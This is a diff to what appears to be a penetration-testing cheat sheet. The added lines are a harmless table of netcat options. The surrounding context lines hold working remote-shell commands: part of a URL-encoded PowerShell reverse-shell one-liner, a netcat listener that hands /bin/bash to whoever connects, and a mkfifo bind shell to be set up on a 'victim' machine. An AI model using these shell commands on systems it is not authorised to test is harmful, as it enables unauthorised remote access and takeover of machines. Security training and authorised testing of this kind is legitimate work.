@@ -29,3 +29,16 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 * Listener ```nc -lvnp <PORT> -e /bin/bash```
 * Connect via ```nc <IP> <PORT>```
 * Or for a bind shell setup this listener on victim ```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` then use ```nc <IP> <PORT>``` from attacking terminal.
+
+| Netcat Option | Description |
+|---------------|-------------|
+| -l | Starts Netcat in listen mode. The default mode is to act as a client. |
+| -L | Starts Netcat in the Windows-only "listen harder" mode. This mode creates a persistent listener that starts listening again when the client disconnects. |
+| -u | Starts Netcat in UDP mode. The default is to use TCP. |
+| -p | Specifies the port that Netcat should start listening on in listen mode. In client mode, it specifies the source port. |
+| -e | Specifies the program to execute when a connection is made. |
+| -n | Tells Netcat not to perform DNS lookups for host names on the other end of the connection. |
+| -z | Starts Netcat in zero I/O mode, which instructs it to send a packet without a payload. |
+| -w <seconds> | Specifies the timeout value for connections. |
+| -v | Starts Netcat in verbose mode. |
+| -vv | Starts Netcat in very verbose mode. |
